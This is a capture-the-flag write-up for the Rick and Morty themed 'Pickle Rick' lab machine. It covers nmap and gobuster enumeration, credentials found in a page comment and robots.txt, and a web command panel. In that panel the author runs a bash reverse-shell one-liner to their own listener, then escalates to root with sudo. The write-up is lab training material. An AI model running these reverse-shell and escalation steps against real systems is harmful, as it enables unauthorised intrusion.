**Tristan Gomez**

# Pickle Rick

### Description:
`
This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.
`

### Setup

To start the challenge click the `Start Machine` button and wait 1 minute for the target's IP address to appear.
I elected to connect my computer using openvpn instead of the `Attack Box` option. Send the target's IP address a ping to check if its up.

### Step 1: Intel Gathering


Begin with an nmap scan of the target. I elected to use SYN scans

`nmap -sS 10.10.x.x`

We get back two services.

`
PORT    STATE   SERVICE
22/tcp  open    ssh
80/tcp  open    http
`

Looks like there is a website running, lets check it out. When I open `10.10.x.x` in my browser, I am greeted by a picture of Rick and Morty running from some aliens with the text.

```
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

Doesn't look like this text has any useful hints. Let's check the page's source next using the browser's dev tools. When I expand the HTML there is a comment with a username. 

`
    Note to self, remember username!

    Username: R1ckRul3s
`

There are no links to other possible pages in the page's source. Im going to check if there is a robots.txt for this site. Sure enough, there is a robots.txt with what could be a password `Wubbalubbadubdub`. There doesn't appear to be anything else useful in this page. <br />

I am going to run `gobuster` to enumerate a *small* file of directory names. We'll see if there are any other pages that are hiding. I ran `gobuster dir -w directoy-list-2.3-small.txt -u 10.10.x.x`. While this is running, open another terminal window and run `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -u 10.10.x.x`. <br />

My first scan yields `/assets`. Opening it up in the browser, I can see adirectory of files. There are a few .js, .css, .jpg, and .gif files but no futher info is gained from examining these files. <br />

My `.php` scans have gone much better. I have found a `/login.php` and a `/portal.php`, which redirects back to `/login.php`.

### Step 2: Initial Entry

The `login.php` page has a generic username and password form. Using `R1ckRul3s:Wubbalubbadubdub` I am able to successfully login. We are redirected to `/portal.php` and on this page is a `Command Panel` which has a fillable text area below it. There is a conspicuous green button that says `Execute`. My gut instinct is to type `ls` and click `execute` to see if it is a linux machine. <br />

We get back

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

From here, I opened `/Sup3rS3cretPickl3Ingred.txt` through the browser, which gives the first ingredient. If we try to `cat` the file using this `Command Panel` we get the error message `Command disabled to make it hard for future PICKLEEEE RICCCKKKK.`. At this point, I am going to attempt to run a reverse shell. On my machine I will run `netcat -l -p 11111`. In the `Command Panel` I am going to enter `bash -c 'bash -i >& /dev/tcp/10.2.84.164/1111 0>&1'`. Looking at my netcat window I get 

```
bash: cannot set terminal process group (1341): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-108-131:/var/www/html$
```

If we try to run `cat` again on the file containing the first flag, we can seer that this is finally working. Let's check Rick's permissions using `sudo -l`.

```
User www-data may run the following commands on
        ip-10-10-108-131.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

```

Looks like we can do whatever we want. Let's run `sudo bash` then `whoami` => `root`. Ohohohoho, looks like we have free run of the place. Lets go to `/home` where there is a directory `/rick` stepping into it and listing its contents shows a file `second ingredients`. Using `cat` to see what's inside, we find the second flag. <br />

Finally `cd /root` and `ls`. There is a `3rd.txt` file. Examining its contents gives us the final flag. 
